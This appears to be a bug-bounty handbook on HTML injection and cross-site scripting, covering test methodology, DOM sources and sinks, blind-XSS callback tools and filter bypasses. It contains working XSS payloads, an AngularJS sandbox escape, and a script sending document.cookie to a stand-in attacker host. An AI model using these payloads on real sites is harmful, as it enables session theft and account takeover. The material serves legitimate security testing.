# XSS & HTML Injection — Bug Hunter Handbook

> Practical guide: **Concept → When to Test → How to Test → Payloads → Notes & Bypasses**

---

## Table of Contents
1. HTML Injection
2. Cross‑Site Scripting (XSS) — Types & When to Test
3. Methodology (Recon → Probe → Exploit)
4. Crafting Payloads (Intentions & Modifications)
5. DOM‑based XSS: Sources, Sinks & Common Patterns
6. Tools & Services for Blind XSS
7. Frameworks & Framework‑specific Notes (AngularJS example)
8. Practical Tips, Tricks & Common Bypasses
9. Useful References

---

# 1. HTML Injection

**Concept**
- HTML Injection occurs when user input containing HTML tags/attributes is reflected into a page without proper encoding/escaping, allowing an attacker to inject markup.
- Often a low‑impact finding by itself, but it frequently escalates to XSS when JavaScript execution becomes possible.

**When to test**
- Any input field (GET/POST/JSON), URL path segments, hidden parameters, file upload filenames, comments, contact forms, profile fields, and any place that ends up in HTML source.

**How to test**
- Send simple probes: `<>`, `</>`, `"` and see how the app reflects or encodes them.
- Test GET parameters (appear in URL) and POST JSON bodies (edit and resend via a proxy like Burp).
- Modify hidden fields or client‑side parameters in the browser or via Burp.

**Why it matters**
- Even if the app only reflects HTML (no JS), a clever payload can introduce `href` links, `meta` tags, or image tags that lead to other attacks or social engineering.

**Example checks**
- Inputs used in email templates (contact forms): injection may reflect into emails — add a link to escalate impact.
- File upload names or image descriptions that become part of a profile page.

**Key takeaway**: Treat HTML Injection as a **gateway** — look for places where markup can become script or a DOM sink.

---

# 2. Cross‑Site Scripting (XSS)

**Concept**
- XSS is HTML injection that results in execution of JavaScript in a victim’s browser.

## Types, at a glance
- **Reflected XSS** — payload is in a request (often URL) and reflected in the response.
  - When to test: search inputs, search boxes, URL parameters, redirect or error pages that include parameter values.
- **Stored XSS** — payload is persisted on the server (DB, logs, profile fields) and later served to users.
  - When to test: message boards, profile fields, comments, product reviews, admin notes, feedback forms.
- **DOM‑based XSS** — client‑side JavaScript manipulates user‑controlled data (e.g., `location`, `hash`, `localStorage`) leading to code execution without a server round‑trip.
  - When to test: client apps that build HTML from `document.*`, `innerHTML`, `eval()`, `setAttribute()`, `location`, `hash`, `postMessage()` etc.
- **Blind XSS** — payload is stored/executed elsewhere and you don't see the result directly (e.g., admin panel, email, other users).
  - When to test: any stored input that is not visible to the reporter (reporting forms, ticket systems, admin-only pages).
- **Self‑XSS** — social engineering trick convincing a user to paste malicious JS into their console or an input.

**Source‑based classification**
- Source‑based: Reflected/Stored (server involved).
- Pure client: DOM‑based (no server reflection required).

**When to prioritize**
- Stored XSS and DOM‑based issues generally offer higher impact (persistent effect, broad reach) — prioritize testing where sensitive users or admin views consume input.

---

# 3. Methodology — Recon → Probe → Exploit

## 1) Recon
- Subdomain discovery (subfinder, amass, crt.sh)
- Enumerate endpoints and files (directories, robots.txt, sitemaps, dorks)
- Collect all request flows (login flows, upload endpoints, API endpoints)
- Identify visible & hidden parameters in forms and JS files
- Map which inputs end up in HTML, attributes, scripts, or JSON

## 2) Probing / Fuzzing
- Test characters individually: `<`, `>`, `"`, `'`, `/`, `\`, `&`, `=`
- Try HTML special combos: `><"'` and observe how the app reflects/encodes them
- For JSON POSTs, alter values and inject tags (remember JSON escapes quotes as `\"`)
- For parameters delivered via `select`/`option` elements, modify client‑side DOM or intercept and change values with Burp

## 3) Try payloads
- Start with benign POCs: `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`
- If blocked, move to obfuscated/encoded or DOM‑specific payloads
- For blind/stored cases, use out‑of‑band callbacks (xss.report, XSS Hunter, Burp Collaborator)

---

# 4. Crafting Payloads — Intention & Modification

**Intention** — decide the goal first:
- Proof of Concept (alert box)
- Data exfiltration (session cookie → remote server)
- Keylogging or persistent control
- Bypass WAF/filters to reach a higher impact

**Modification** — adapt syntax to the target context:
- Inject inside HTML body, attribute, JS string, JSON value, URL, or inside a tag like `<svg>`
- If signature filters exist, change payload grammar (e.g., use `constructor` tricks, event handlers, or data URIs)

**Payload examples (POC)**
- Basic: `<script>alert(1)</script>`
- SVG (useful in many contexts): `<svg onload=alert(1)>` or `<svg><animate onbegin=alert(1) /></svg>`
- Attribute injection (close attribute/tag then add payload): `"></svg><svg onload=alert(1)>`
- JS pseudo‑protocol in URL contexts: `javascript:alert(1)` (works when the attribute accepts a URL)

**Session stealing example**
```html
<script>
  fetch('https://attacker.com/steal?c='+btoa(document.cookie));
</script>
```

**Obfuscation tricks**
- Use broken tag nesting: `<scr<script>ipt>alert(1)</scr</script>ipt>`
- Use comments to break filters: `</script><!--` then payload
- Use string concatenation or constructor trick: `[]['constructor']('alert(1)')()`

---

# 5. DOM‑based XSS — Sources, Sinks & Patterns

**Core idea**: DOM‑based XSS occurs when client JS reads attacker‑controlled data (source) and writes it into a sink that executes code or changes the DOM dangerously.

**Common sources**
- `location`, `location.search`, `location.hash`
- `document.referrer`, `document.cookie` (if used unsafely)
- `localStorage`, `sessionStorage`, `postMessage()`
- Values from `input` fields that are later used by JS without sanitization

**Common sinks** (dangerous APIs)
- `innerHTML`, `outerHTML`, `document.write()`
- `eval()`, `setTimeout()`/`setInterval()` with string args
- `element.setAttribute()` for `src`/`href`/`on*` attributes
- `insertAdjacentHTML()`

**Testing approach**
1. Identify candidate source in the app's JS. Search for code that reads `location.*`, `document.*`, storage or cookies.
2. Find the sink where that data is used; test by injecting benign markers into the source (e.g., `TEST1`) and see if they appear in the DOM.
3. Close tags or break context to inject executable payloads (e.g., `</span><svg onload=alert(1)>`).

**DOM examples & tricks**
- If the input is placed inside a container element or attribute, close it, and open a new tag: `</div><svg onload=alert(1)>`
- Fragment/hash injection: use `location.hash` for payloads that never hit the server but will be processed by client JS.
- Use an `iframe` to craft payloads for hash manipulation and onload/onerror triggers.

**Evaluation**: DOM‑based issues are often easier to exploit when the app builds HTML dynamically — always inspect linked JS files.

---

# 6. Blind XSS & OOB Tools

**Blind XSS** arises when the injected payload executes in another user’s context (admins, support staff) and you cannot directly see the output.

**Tools**
- **xss.report**: custom payload generation + callback listener (not always free)
- **XSS Hunter**: historically popular for capturing callbacks (hosting may require setup)
- **Burp Collaborator**: intercept OOB interactions (available in Burp Pro)

**How to use**
- Insert a callback URL into the payload: `<script src="https://<unique>.xss.hunter">` or use `fetch('https://<unique>.oob')`
- Monitor the service for connections and captured data (headers, IPs, cookies)

**When to use**
- Feedback/ticket systems, contact forms, admin notes, or any field where content is viewed later by privileged users.

---

# 7. Frameworks — AngularJS (example)

**AngularJS specifics**
- Expressions can be injected using `{{ }}` (double mustache) if user input reaches compiled templates.
- AngularJS expressions normally run in a sandbox limiting access to global `window` functions like `alert`.

**Constructor trick**
- Bypass sandbox by calling a constructor: `{{$on.constructor('alert(1)')();}}`
  - `$on` is an Angular built‑in. `constructor` returns the function constructor so you can create and run arbitrary code.

**When to test**
- Look for `ng-app` or Angular script includes, and places where the page compiles user content into templates.

**Other framework notes**
- Always look for nonstandard sanitization or encoding: some libraries perform partial escaping (first occurrence only) or only encode certain contexts. These mistakes are exploitable.
- For templating engines that render server‑side, payloads may appear in page source (easier to test). For client frameworks (React, Angular, Vue) inspect the JS for dangerous APIs.

---

# 8. Practical Tips, Tricks & Common Bypasses

**General tips**
- Test single special characters first to understand encoding behavior.
- Check if the application uses `eval()` on JSON assignment (dangerous). If JSON is passed to `eval()` instead of `JSON.parse()`, injected JS may execute.
- For `POST` forms with `application/json`, remember quotes will be escaped — craft payloads accordingly.

**Bypass techniques**
- Broken tag nesting: `<scr<script>ipt>alert(1)</scr</script>ipt>`
- Use attributes that load remote scripts (where allowed) or use `data:` URIs.
- Use DOM context switching: close the current tag and open a new tag to escape encoding constraints.
- If an input is restricted to certain element types (e.g., `select` → `option`), intercept and modify the request in Burp.

**Contextual payloads**
- When input appears inside an HTML attribute value, try `" onmouseover=alert(1) x="` to break out of the attribute context.
- When inside a JS string, try `');alert(1);//` or escape strategies suitable to the surrounding quoting style.

**Edge cases**
- PHP apps sometimes reflect path segments: `https://domain.com/dir/file.php/">...` If `$_SERVER['PHP_SELF']` is used unsafely, payloads in the URL path can appear in the source.
- Image uploads: filenames or metadata may be reflected; if the app renders `<img src="uploads/<filename>">`, crafted filenames can cause HTML/JS issues in some servers.

**Notes about JSON**
- JSON responses containing quotes will often represent them escaped (`\"`). If that JSON is later `eval()`ed client‑side, an injection may become executable.

---

# 9. Example Testing Checklist (Quick)
- [ ] Find subdomains & endpoints
- [ ] Enumerate visible & hidden parameters
- [ ] Probe each parameter with `<`, `>`, `"`, `\`, `/`
- [ ] Test reflected inputs in URL & POST JSON
- [ ] Test stored inputs (comments, profiles, tickets)
- [ ] Inspect JS files for `location`, `innerHTML`, `eval`, `setAttribute`
- [ ] Try POC payloads (SVG, img onerror, script)
- [ ] Use OOB tools for blind/stored cases (xss.report, Burp Collaborator)
- [ ] Report with affected URL, payload, impact, and remediation guidance

---

# 10. Useful References
- *Testing for XSS (knoxss) – Brutelogic* (methodology guide)
- Web Archive snapshots of helpful articles and write‑ups for deeper reading


---

> **Final note:** This handbook is arranged to be practical: for each target, identify context (HTML attribute, JS string, DOM insertion), choose an appropriate payload style, and iterate with small probes. Keep OOB listeners ready for blind testing and always validate results across different browsers where behavior differs.

